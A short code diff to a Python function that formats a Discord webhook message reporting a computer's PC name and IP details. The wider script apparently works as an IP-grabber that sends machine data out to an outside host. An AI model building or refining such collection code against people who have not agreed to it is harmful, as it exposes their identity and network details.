@@ -21,10 +21,10 @@ def send_to_discord(webhook_url, ip_info):
 
     # Preparing data for Discord
     data = {
-        "content": pc_name,  # Use the PC name as the message content
+        "content": f"PC Name: {pc_name}",  # Display the PC name here
         "embeds": [
             {
-                "title": "User IP Details",
+                "title": f"{pc_name}'s IP Details",  # Title includes the PC name
                 "description": f"Here is the IP information for {pc_name}.",
                 "fields": [
                     {"name": "IP", "value": ip_info.get("ip", "N/A")},
